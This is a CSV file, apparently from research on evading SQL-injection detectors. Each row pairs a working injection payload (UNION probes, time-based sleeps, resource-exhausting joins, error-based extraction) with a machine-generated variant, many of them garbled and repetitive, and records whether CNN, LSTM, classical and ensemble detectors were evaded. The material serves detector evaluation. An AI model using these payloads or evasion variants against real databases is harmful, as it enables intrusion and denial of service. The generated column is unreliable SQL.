,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
3741,"1""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""opgb"" like ""opgb","SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(success_injection) FROM SQL SELECT MIN(success_injection) FROM SQL SELECT MIN(success_injection) FROM SQL SELECT MIN(success_injection) FROM SQL SELECT MIN(success_injection) FROM Query: 1"" AND STRFTIME('%y', '%s-%m-%d', '%SQL', '-0 year')",1,1,0,0,1,0,0
3742,"1""   )    )    as ynuw where 9138  =  9138",SELECT MIN(9138 = 9138) FROM SQL injection detection,1,1,1,1,1,1,1
3743,"1' where 6147  =  6147   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",SELECT MIN(sql injection) FROM SQL_injection WHERE '6147 = 6147',0,1,1,1,0,1,0
3744,"1%"" and   (  3020  =  3020  )  *6703 and ""%""  =  ""","SELECT MIN(3020 = 3020) *6703 AND ""SQL injection detection"" ='sq injection'",0,1,0,0,0,0,0
3745,"-8053"" where 5458  =  5458 or 9323  =  9323#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -8053 WHERE 5458 = 5458 OR 9323 = 9323#,1,1,0,1,0,0,0
3746,"1'  )   where 7640  =  7640 and make_set  (  8978  =  8594,8594  )  --","SELECT MIN(8794 = 8594,8594) FROM SQL injection detection WHERE SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(8594 = 8594,8594) FROM SQL SELECT SELECT MIN(8794 = 7640 = 7640 AND NOT SELECT SELECT MIN(8978 = 8594 = 794",0,1,0,0,1,0,0
3747,"-6496""  )   as obnf where 2903  =  2903 or make_set  (  9354  =  9354,7185  )  --",SELECT MIN(7185) FROM SQL injection AS _evade_sq_injection FROM SQL_injection WHERE 2903 = 2903 OR make_set = 9354 = 9354 = 715,1,1,0,0,0,0,0
3748,-1432 order by 1#,SELECT MIN(1#) FROM query: -1432 ORDER BY 1#,1,1,1,0,1,1,0
3749,"1'+  (  select ouhd where 8905  =  8905 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'","SELECT MIN(*) FROM SQL_injection) FROM SELECT SELECT MIN(sqlinjection) FROM SELECT SELECT MIN(sqlinjection) FROM SELECT SELECT MIN(sqlinjection) FROM SELECT SELECT MIN(sqlinjection) FROM SELECT SELECT MIN(sqlinjection) FROM SELECT MIN(sqlinjection) FROM SELECT MIN(SELECT MIN(*) FROM SQL SELECT & sysusers FROM SELECT SELECT & sys__0 WHERE sysusers as sys1,sysusers as sys1,sysusers as sqlinjection) FROM SELECT SELECT SELECT & / FROM SELECT SELECT MIN(sqlinjection) FROM SELECT SELECT SELECT MIN(sqlinjection) FROM SELECT SELECT SELECT MIN(sqlinjection",1,1,0,0,1,0,0
3750,select case when 5433  =  6458 then 1 else null end--,SELECT MIN(1 AS _null end--) FROM SQL injection detection WHERE 5433 = 6458 AND NOT SELECT SELECT MIN(1 = 0,1,1,1,0,0,0,0
3751,"1'  )   where 7093  =  7093 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(sql injection) FROM SQL_injection WHERE 7093 = 7093 AND 8148 = like (SELECT MIN(sql injection) FROM SQL Query: 1),1,1,1,0,0,0,0
3752,"-5058%' union all select 6789,6789,6789,6789,6789#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(SQL) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT ,1,0,1,0,1,1,0
3753,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""%""  =  ""","SELECT * FROM SQL injection detection, COUNT(*) FROM SQL_users WHERE NOT all_users = 'T1' AND NOT all_users = 'T1.all_users'",1,1,0,0,0,0,0
3754,"1%""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  ""","SELECT MIN(sql injection) FROM SQL SELECT DISTINCT 'abcdefg',upper ( hex ( randomblob ( 500000000000/2 )' AND (% = 'exass injection')",1,1,0,0,0,0,0
3755,-9405' union all select 2539--,SELECT MIN(2539--) FROM SQL injection detection,1,1,0,1,1,1,0
3756,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#","SELECT MIN(sql injection) FROM 7745,7745,7745,7745,7745# FROM SQL_Injections WHERE NOT MIN(sql injection) = 'exast injection'",1,1,1,1,0,1,0
3757,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,"SELECT MIN(sequence) FROM SQL injection detection WHERE NOT case when(1272 = 5883 ) AND 1272 = ""du dual-- end )""",0,1,0,0,0,0,0
3758,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa","SELECT MIN(4551 = 6487,6487 ) FROM SQL injection detection",1,1,1,1,1,1,1
3759,"1""  )   where 7723  =  7723 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",SELECT MIN(sequence) FROM SQL injection detection WHERE 7723 = 7723 AND 6240 = '6240' AND 'qqpjq'|| (SELECT SELECT SELECT DISTINCT 0 end from rdb$database )||'qzvzq'),1,1,0,0,0,0,0
3760,"-3445 union all select 5505,5505,5505--","SELECT MIN(555,5505--) FROM SQL SELECT MIN(sql injection) FROM Query: -3445 union All select 5505,5505,5505--",1,1,0,0,0,0,0
3761,"1""   )    )    as szxa where 1501  =  1501 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT MIN(*) FROM SQL injection, SELECT MIN(sql injection) FROM szxa WHERE 1501 = 1501 AND 8189 = (SELECT MIN(sysibm.systables as t2,sysibm.systables as t3 FROM szxa)",1,1,0,0,0,0,0
3762,"1'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT MIN(selection__evade_sq_injection) FROM SQL_injection WHERE NOT domain.domain.columns = ""t1, domain.tables as t3 ) = 3580",0,1,0,0,0,0,0
3763,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   '%'  =  '","SELECT * FROM SQL injection, COUNT(*) FROM sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 AND ((%) = '%')",1,1,0,0,0,0,0
3764,"select pg_sleep  (  5  )   and ""%""  =  ""","SELECT * FROM pg_sleep WHERE NOT SQL_injection = ""valid""",1,1,1,1,1,1,1
3765,1   )    )    and 7533  =  7533 and    (    (   8738  =  8738,SELECT 8738 FROM SQL AS _valid_sQCH_Required = '7533 = 7533 AND ( ( (8738 = 8738),1,1,0,0,0,0,0
3766,"1  )   where 9432  =  9432 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT MIN(*) FROM SQL_Injection) FROM SELECT SELECT MIN(*) FROM SELECT SELECT MIN(*) FROM SELECT SELECT MIN(*) FROM SELECT SELECT MIN(*) FROM SQL Injection) FROM SELECT SELECT MIN(*) FROM SELECT SELECT MIN(*) FROM SELECT SELECT MIN(*) FROM SELECT SELECT MIN(*) FROM SQL SELECT SELECT & 9432 = 9432 AND sysusers as sys1,sysusers as sys7 WHERE sys0 = 9432 AND NOT SELECT SELECT & start of year FROM SELECT SELECT MIN(*) FROM SQL Injection) FROM SELECT SELECT MIN(SELECT MIN(SELECT MIN(*) FROM SELECT SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(*) FROM SQL SELECT MIN(SEL",1,1,0,0,1,0,0
3767,"1""  )   where 2633  =  2633 union all select null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: 1,1,1,1,1,1,1,1
3768,select sleep  (  5   )    )   ||',SELECT MIN(SQL) FROM SQL injection detection,1,0,1,1,1,1,1
3769,"1""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""gvlc"" like ""gvlc","SELECT MIN(sql injection) FROM SQL - SELECT gvlc FROM ""elude"" FROM SQL injection detection""",1,0,1,1,1,1,1
3770,"1"" where 5796  =  5796 and sleep  (  5  )  #",SELECT MIN(5 ) FROM SQL injection detection,1,0,1,1,1,1,1
3771,1%' and 9127  =  7687--,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: 1%' AND 9127 = 7687--,1,1,0,0,0,0,0
3772,"1'  )   as ybuv where 9641  =  9641 union all select null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
3773,"1""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SELECT * FROM SQL_injection WHERE NOT rdb$types = 't2,rdb$collations as t3,rdb$functions as t4"" ORDER BY COUNT(*) DESC LIMIT 1",0,1,0,0,0,0,0
3774,"-6554'   )    )     )   union all select 4384,4384,4384,4384,4384#","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT STRFTIME('%y', 4384,4384,4384#) ='sql injection detection'",1,1,0,0,1,0,0
3775,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,SELECT MIN(sql ing_syst_injection) FROM SQL SELECT MIN(syst_injection) FROM SQL SELECT MIN(syst_injection) FROM query: 1 AND NOT SELECT gcrr FROM (SELECT gcrr FROM (SELECT gcrr FROM SQL SELECT gcrr FROM SQL SELECT gcrr FROM query: 1 ORDER BY id LIMIT 1),1,1,1,1,1,1,1
3776,"1'||  (  select 'cjwx' from dual where 7637  =  7637 and elt  (  9548  =  3991,3991   )    )   ||'","SELECT cjwx FROM SQL - 7637 = 7637 AND elt ( 9548 = 3991,3991 ) ||""",0,1,0,0,0,0,0
3777,"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--","SELECT 6617,6617,6617,6617-- FROM SQL_Injection WHERE NOT 6617,6617,6617,6617-- if executed = ""SQ injection""",1,1,1,0,0,0,0
3778,select   (  case when   (  4636  =  1108  )   then 1 else 4636*  (  select 4636 from master..sysdatabases  )   end  )  --,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query:SELECT MIN(sql injection) FROM master..sysdatabases ) FROM SQL,1,1,0,1,1,1,0
3779,"1"" where 3510  =  3510",SELECT MIN(3510 = 3510) FROM SQL injection detection,1,1,0,1,1,1,0
3780,"1""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""fbqy"" like ""fbqy","SELECT COUNT(*) FROM SQL_injection WHERE NOT sysusers as sys1,sysusers as sysusers as sys4,sysusers as sys7 INTERSECT SELECT DISTINCT COUNT(*) FROM sysusers WHERE NOT sysusers as sys1,sysusers as sys4,sysusers as sys7 - fbqy = ""Fbqy""",1,1,0,0,0,0,0
3781,"-8382""   )    )    order by 1--","SELECT MIN(1 AS __executive_requirement) FROM SQL injection_requirement WHERE NOT SELECT_requirement_method_code ='sql injection' ORDER BY _executive_requirement_requirement_requirement_requirement_requirement_requirement_requirement_requirement_requirement_requirement_required"" FROM SQL injection'",0,0,1,1,1,1,1
3782,"1   )    )    as fynx where 9636  =  9636 union all select null,null,null,null,null--","SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(null,null,null--) FROM SQL SELECT MIN(null) FROM sq injection detection",1,1,1,0,1,1,0
3783,"-9734'   )    )    as izbx where 6273  =  6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--","SELECT MIN(6273,6273,6273,6273,6273,6273-- FROM SQL injection AS t1 JOIN 6273, 6273, 6273, 6273, 6273, 6273, 6273, izbx as izbx' FROM SQL JOIN 6273, 6273, 6273,6273,6273,6273,6273,6273, 6273, 6273 = 6273 = 6273 AS t2 ON t1.6273 = t2.6273 = -9734' SELECT MIN(6273 = 6273 WHERE izbx = 6273 = 6273 AND 6273 = 6273 = 6273 AND 6273 = 6273 = 6273 AS t2 WHERE t1.6273 = 6273 = 6273 AND 6273 = 6273 = 6273 AND 6273 = 6273 AS t2 ON t1.6273 = t2.6273 = t2.",1,1,0,0,0,0,0
3784,-4494 or 5291  =  4452,SELECT * FROM query: -4494 ORDER BY query: -4494 = 4452,1,1,1,1,1,1,1
3785,1   )    )    as izvy where 2569  =  2569,SELECT izvy FROM izvy WHERE 2569 = 2569 AND NOT izvy = 2569,1,1,1,1,1,1,1
3786,"1 where 8074  =  8074 and elt  (  3114  =  3114,sleep  (  5   )    )   #","SELECT * FROM SQL AS _number WHERE _valid_sq = '8074 = 8074' AND NOT SELECT SELECT DISTINCT sleep ( 5 ) - 1 FROM query: 1 WHERE SELECT SELECT DISTINCT SQL_injection' FROM query: 1 WHERE 8074 = 8074 AND NOT SELECT elt ( 3114 = 3114,sleep ( 5 )",0,1,0,0,0,0,0
3787,1'+  (  select qydm where 6019  =  6019,SELECT qydm FROM SQL injection_detection WHERE 6019 = 6019,1,1,1,1,1,1,1
3788,1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
3789,"1%"" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT MIN(sql) FROM SQL injection - SELECT MIN(sql) FROM SQL - injection,1,1,1,1,1,1,1
3790,select   (  case when   (  4568  =  4241  )   then 4568 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM dual - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM /,1,1,0,1,1,1,0
3791,-3613%'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  '%'  =  ',SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM -CHr ( 113 ) ||chr ( 113 ) ||chr ( 62 )) FROM SQL - SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM xmltype ( xr ( 113 ) ||chr ( SELECT MIN(sql - re-chr ( xr ( ) FROM dual ) ORDER BY MIN(sql injection),1,1,0,0,0,0,0
3792,-7242' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'kfff'  =  'kfff,SELECT MIN(sqff) FROM SQL injection -7242' ORDER BY kfff_ = 'kfff',1,1,1,1,0,1,0
3793,"1%""   )    )    union all select null,null#",SELECT NOT null# FROM SQL injection detection,1,0,1,1,1,1,1
3794,"1%'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '","SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(1,5000000) FROM generate_series) AND (SELECT MIN(*) FROM generate_series) FROM query_series WHERE NOT query: '%' = '8407')",1,1,0,0,1,0,0
3795,1  ) ,SELECT * FROM SQL AS t1 JOIN query: 1 ON t1.Query: 1 ) = 0,1,1,0,0,0,0,0
3796,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--","SELECT MIN(sql injection) FROM SQL injection detection WHERE 'xyya' = '8750 union all select 8950,8950,8950,8950,8950,8950-- for' AND NOT'sq injection' ='sq injection'",1,1,0,0,0,0,0
3797,1%'   )    )    and 9198  =  9198--,SELECT MIN(exast_injection) FROM SQL_injection WHERE NOT SELECT MIN(excel_injection) FROM SQL_injection),1,0,1,1,1,1,1
3798,-8301'   )    )     )   or   (  5708  =  5268  )  *5268 and    (    (     (  'hkha'  =  'hkha,SELECT MIN(*) FROM SQL injection detection WHERE NOT 5708 = 5268 AND ((((((hkha) = 'hkha') = 'evadesq injection'),1,1,0,0,0,0,0
3799,"-9698'   )    )    as qnjv where 3360  =  3360 or make_set  (  9354  =  9354,7185  )  --",SELECT MIN(7185) FROM SQL injection AS _executive FROM SQL_injection WHERE 3360 = 3360 OR make_set = 9354 = 9354 = 9354 -7185,1,1,0,0,0,0,0
3800,"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
3801,"1   )    )    as xebl where 3105  =  3105 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL_injection) AS _execut FROM SQL_injection WHERE 3105 = 3105 OR 8421 = (SELECT MIN(1,5000000) FROM generate_series)",1,1,0,0,0,0,0
3802,1' and   (  3020  =  3020  )  *6703,SELECT MIN(3020 = 3020) FROM SQL injection detection,1,1,0,1,1,1,0
3803,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,SELECT DISTINCT'sql injection' FROM SQL injection',1,0,1,1,1,1,1
3804,"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",SELECT MIN(sdo ) FROM SQL injection detection,1,0,1,1,1,1,1
3805,"make_set  (  2672  =  2672,5440  )  ",SELECT * FROM SQL_set WHERE NOT SQL_injection = 'yes',1,0,1,1,1,1,1
3806,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'ineq' like 'ineq,SELECT 6969 FROM pg_sleep WHERE NOT'sq injection' IN (SELECT 6969 FROM pg_sleep ( 5 ) ) AND (((((SELECT 6969 FROM pg_sleep) - SELECT 6969 FROM pg_sleep) AND ((((((SELECT 6969 FROM pg_sleep) = 6969),0,1,0,0,0,0,0
3807,"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  -- wvjy","SELECT * FROM wvjy WHERE NOT wvjy = ""valid""",1,0,1,1,1,1,1
3808,1  )   as odqn where 3910  =  3910,SELECT NOT (SELECT SUM(example) FROM Query: 1 ) AS odqn FROM odqn WHERE 3910 = 3910 = 3910 AND NOT SQL_injection IS NULL,1,1,0,0,1,0,0
3809,-8945   )    )    as fszo where 2320  =  2320 union all select 2320--,SELECT MIN(2320 = 2320--) FROM SQL injection AS _evade_sql injection_detecting,1,1,1,0,0,0,0
3810,"-5097'  )   union all select 8992,8992,8992,8992,8992,8992,8992,8992,8992--","SELECT 8992,8992,8992,8992,8992,8992,8992,8992-- for SQL injection,'sq injection' FROM SQL Query: -5097')",1,1,1,1,0,1,0
3811,"1',  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",SELECT MIN(sequence) FROM SQL injection detection,1,0,1,1,1,1,1
3812,"1'   )    )    as arhm where 3268  =  3268 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --","SELECT MIN(s) FROM SQL injection_diagnosis AS :_sq_injector WHERE 3268 = 3268 ORDER BY 0x71706a71, 0x71706a71, 0x71706a71, 0x71706a71, 0x71706a71, 0x71706a71, 0x71706a71, 0x71706a71, 0x71706a71, SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SELECT AS _ FROM SQL_injector WHERE 3268 = 3268 OR (SELECT MIN(s) FROM 2* (SELECT SELECT MIN(s) FROM SQL_INJECT,'sql - s,'sql injection') FROM SELECT,'sql injection','sql injection') FROM SQL_injector WHERE 3268 = 3268 = 3268 ORDER BY 0x71706",0,1,0,0,0,0,0
3813,"1 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SELECT * FROM SQL injection, SELECT SUM(short count ( * ) FROM SQL Query: 1 ORDER BY SQL injection.short_number",1,0,1,1,1,1,1
3814,"-5190%"" or 8298  =  9306 and ""%""  =  ""","SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -5190% or 8298 = 9306 AND ""%"" = ""%""",1,1,0,0,0,0,0
3815,"1%""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT * FROM SQL injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN 7417 = sysibm.systables as t2,sysibm.systables as t3 JOIN (SELECT SUM(*) FROM SQL JOIN sysibm.systables as t2,sysibm.systables as t3 WHERE NOT sysibm.systables as t3 = 7417",1,1,0,0,0,0,0
